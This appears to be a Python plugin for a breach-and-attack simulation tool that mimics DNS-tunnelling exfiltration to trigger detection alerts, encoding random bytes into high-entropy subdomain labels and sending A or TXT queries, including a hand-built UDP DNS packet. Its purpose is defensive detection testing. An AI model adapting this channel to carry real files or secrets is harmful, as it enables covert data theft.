"""
dns_tunnel_exfil — DNS tunneling exfiltration simulation.

Encodes a dummy payload into a sequence of high-entropy subdomain labels and
issues TXT (or A) queries against a base domain. Triggers Cortex EALs covering:

  * Anomalous DNS query volume from a single host
  * High-entropy / base32 / base64 DNS labels
  * Long FQDNs that exceed customary lengths
  * DNS TXT query bursts (unusual relative to baseline)

Implementation note: the plugin uses ``socket.getaddrinfo`` for A queries and
a tiny stdlib-only TXT resolver to keep the dependency surface flat. Plugins
should never *exfiltrate* real customer data — payloads are randomly generated
inside the plugin and never sourced from outside.
"""

from __future__ import annotations

import asyncio
import base64
import logging
import random
import socket
import string
from typing import Optional

from pydantic import BaseModel, Field, field_validator

from ..base import BaseSimulation, SimulationContext, SimulationResult
from ..audit import ecs_event


logger = logging.getLogger("cortexsim.eal.plugins.dns_tunnel_exfil")


class DnsTunnelExfilParams(BaseModel):
    base_domain: str = Field(..., description="Authorised base domain.")
    chunks: int = Field(default=20, ge=1, le=2_000)
    chunk_size_bytes: int = Field(default=24, ge=4, le=48)
    sleep_seconds: float = Field(default=1.0, ge=0.0, le=300.0)
    encoding: str = Field(default="base32", description="base32 | base64 | hex")
    query_type: str = Field(default="A", description="A | TXT")
    resolver: Optional[str] = Field(
        default=None,
        description="Optional resolver IP for TXT queries (defaults to system).",
    )

    @field_validator("base_domain")
    @classmethod
    def _domain_format(cls, v: str) -> str:
        v = v.strip().lower()
        if not v or v.startswith("."):
            raise ValueError("base_domain must be a non-empty FQDN")
        return v

    @field_validator("encoding")
    @classmethod
    def _encoding_value(cls, v: str) -> str:
        v = v.lower()
        if v not in ("base32", "base64", "hex"):
            raise ValueError("encoding must be base32, base64 or hex")
        return v

    @field_validator("query_type")
    @classmethod
    def _query_type_value(cls, v: str) -> str:
        v = v.upper()
        if v not in ("A", "TXT"):
            raise ValueError("query_type must be A or TXT")
        return v


def _encode_chunk(blob: bytes, encoding: str) -> str:
    if encoding == "base32":
        out = base64.b32encode(blob).decode().rstrip("=").lower()
    elif encoding == "base64":
        out = base64.urlsafe_b64encode(blob).decode().rstrip("=").lower()
    else:
        out = blob.hex()
    # DNS label hard limit is 63 bytes — clip safely.
    return out[:60]


def _random_payload(size: int) -> bytes:
    rng = random.SystemRandom()
    return bytes(rng.getrandbits(8) for _ in range(size))


class DnsTunnelExfil(BaseSimulation):
    class Meta:
        name = "dns_tunnel_exfil"
        version = "1.0.0"
        description = (
            "Exfiltration over DNS — encodes random payloads as subdomain "
            "labels and issues TXT/A queries to a controlled base domain."
        )
        mitre_techniques = ["T1048.003", "T1572"]
        eal_targets = [
            "DNS Tunneling",
            "Anomalous DNS Volume",
            "High-Entropy DNS Labels",
        ]
        params_model = DnsTunnelExfilParams

    async def run(self, ctx: SimulationContext) -> SimulationResult:
        params: DnsTunnelExfilParams = ctx.params  # type: ignore[assignment]
        started_at = self.utcnow()
        getattr(ctx, "authorise")(params.base_domain)

        events_emitted = 0
        bytes_sent = 0

        if ctx.dry_run:
            await ctx.emit_event(ecs_event(
                action="dns_tunnel_dry_run",
                outcome="success",
                category="network",
                type_="info",
                message=f"DRY-RUN — {params.chunks} planned {params.query_type} queries to *.{params.base_domain}",
                campaign_id=ctx.campaign_id,
                run_id=ctx.run_id,
                step_id=ctx.step_id,
                plugin=self.Meta.name,
                target=params.base_domain,
                extra={"chunks": params.chunks, "encoding": params.encoding},
            ))
            return SimulationResult(
                plugin=self.Meta.name,
                step_id=ctx.step_id,
                status="success",
                started_at=started_at,
                completed_at=self.utcnow(),
                events_emitted=1,
                detail={"dry_run": True, "chunks_planned": params.chunks},
            )

        for i in range(params.chunks):
            payload = _random_payload(params.chunk_size_bytes)
            label = _encode_chunk(payload, params.encoding)
            fqdn = f"{label}.exfil-{i:04d}.{params.base_domain}"

            try:
                if params.query_type == "A":
                    await asyncio.to_thread(self._a_query, fqdn)
                else:
                    await asyncio.to_thread(self._txt_query, fqdn, params.resolver)
                bytes_sent += len(fqdn)
                events_emitted += 1
                await ctx.emit_event(ecs_event(
                    action="dns_tunnel_query",
                    outcome="success",
                    category="network",
                    type_="connection",
                    message=f"DNS {params.query_type} {fqdn}",
                    campaign_id=ctx.campaign_id,
                    run_id=ctx.run_id,
                    step_id=ctx.step_id,
                    plugin=self.Meta.name,
                    target=fqdn,
                    bytes_sent=bytes_sent,
                    extra={
                        "iteration": i + 1,
                        "query_type": params.query_type,
                        "encoding": params.encoding,
                        "label_length": len(label),
                    },
                ))
            except OSError as exc:
                # Resolution failure is *expected* for non-existent labels —
                # the EAL trigger is the query itself, not the response.
                events_emitted += 1
                await ctx.emit_event(ecs_event(
                    action="dns_tunnel_query",
                    outcome="success",
                    category="network",
                    type_="connection",
                    message=f"DNS {params.query_type} {fqdn} (NXDOMAIN, expected)",
                    campaign_id=ctx.campaign_id,
                    run_id=ctx.run_id,
                    step_id=ctx.step_id,
                    plugin=self.Meta.name,
                    target=fqdn,
                    extra={"iteration": i + 1, "resolver_error": str(exc)},
                ))

            if params.sleep_seconds > 0 and i < params.chunks - 1:
                await asyncio.sleep(params.sleep_seconds)

        return SimulationResult(
            plugin=self.Meta.name,
            step_id=ctx.step_id,
            status="success",
            started_at=started_at,
            completed_at=self.utcnow(),
            events_emitted=events_emitted,
            bytes_sent=bytes_sent,
            detail={
                "queries_sent": events_emitted,
                "base_domain": params.base_domain,
                "encoding": params.encoding,
                "query_type": params.query_type,
            },
        )

    # ------------------------------------------------------------------
    # Resolution helpers — kept tiny and stdlib-only.
    # ------------------------------------------------------------------

    @staticmethod
    def _a_query(fqdn: str) -> None:
        socket.getaddrinfo(fqdn, None, type=socket.SOCK_STREAM)

    @staticmethod
    def _txt_query(fqdn: str, resolver: Optional[str]) -> None:
        # Build a minimal DNS query packet for QTYPE=TXT and send via UDP/53.
        # We rely on the resolver doing its own caching/forwarding.
        rng = random.SystemRandom()
        txn_id = rng.randint(0, 0xFFFF).to_bytes(2, "big")
        flags = b"\x01\x00"  # standard query, recursion desired
        counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
        qname = b"".join(
            len(part).to_bytes(1, "big") + part.encode("ascii")
            for part in fqdn.split(".") if part
        ) + b"\x00"
        qtype_qclass = b"\x00\x10\x00\x01"  # TXT, IN
        packet = txn_id + flags + counts + qname + qtype_qclass

        target_ip = resolver or DnsTunnelExfil._system_resolver()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(2.0)
            sock.sendto(packet, (target_ip, 53))
            try:
                sock.recvfrom(4096)
            except socket.timeout:
                pass  # EAL trigger is on the outbound query

    @staticmethod
    def _system_resolver() -> str:
        # Best-effort resolver discovery; falls back to 1.1.1.1.
        try:
            with open("/etc/resolv.conf", "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1]
        except OSError:
            pass
        return "1.1.1.1"
